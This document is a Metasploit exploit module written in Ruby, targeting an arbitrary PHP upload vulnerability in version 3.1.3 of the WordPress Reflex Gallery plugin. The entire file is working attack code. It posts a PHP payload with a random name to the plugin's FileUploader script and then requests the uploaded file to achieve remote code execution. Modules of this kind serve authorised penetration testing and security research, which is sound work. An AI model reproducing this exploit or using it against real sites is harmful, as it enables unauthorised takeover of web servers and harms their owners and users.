##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::HTTP::Wordpress
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Wordpress Reflex Gallery Upload Vulnerability',
      'Description'    => %q{
        This module exploits an arbitrary PHP code upload in the WordPress Reflex Gallery
        version 3.1.3. The vulnerability allows for arbitrary file upload and remote code execution.
      },
      'Author'         =>
        [
          'Unknown', # Vulnerability discovery
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>'  # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['EDB', '36374'],
          ['OSVDB', '88853'],
          ['WPVDB', '7867']
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Reflex Gallery 3.1.3', {}]],
      'DisclosureDate' => 'Dec 30 2012', # OSVDB? EDB? WPVDB? Cannot set the date.
      'DefaultTarget'  => 0)
    )
  end

  def check
    check_plugin_version_from_readme('reflex-gallery', '3.1.4')
  end

  def exploit
    php_pagename = rand_text_alpha(8 + rand(8)) + '.php'

    data = Rex::MIME::Message.new
    data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"qqfile\"; filename=\"#{php_pagename}\"")
    post_data = data.to_s

    time = Time.new
    year = time.year.to_s
    month = "%02d" % time.month

    res = send_request_cgi({
      'uri'       => normalize_uri(wordpress_url_plugins, 'reflex-gallery', 'admin', 'scripts', 'FileUploader', 'php.php'),
      'method'    => 'POST',
      'vars_get'  => {
        'Year'    => "#{year}",
        'Month'   => "#{month}"
      },
      'ctype'     => "multipart/form-data; boundary=#{data.bound}",
      'data'      => post_data
    })

    if res
      if res.code == 200 && res.body =~ /success|#{php_pagename}/
        print_good("#{peer} - Our payload is at: #{php_pagename}. Calling payload...")
        register_files_for_cleanup(php_pagename)
      else
        fail_with(Failure::Unknown, "#{peer} - Unable to deploy payload, server returned #{res.code}")
      end
    else
      fail_with(Failure::Unknown, 'Server did not respond in an expected way')
    end

    print_status("#{peer} - Calling payload...")
    send_request_cgi(
      'uri'       => normalize_uri(wordpress_url_wp_content, 'uploads', "#{year}", "#{month}", php_pagename)
    )
  end
end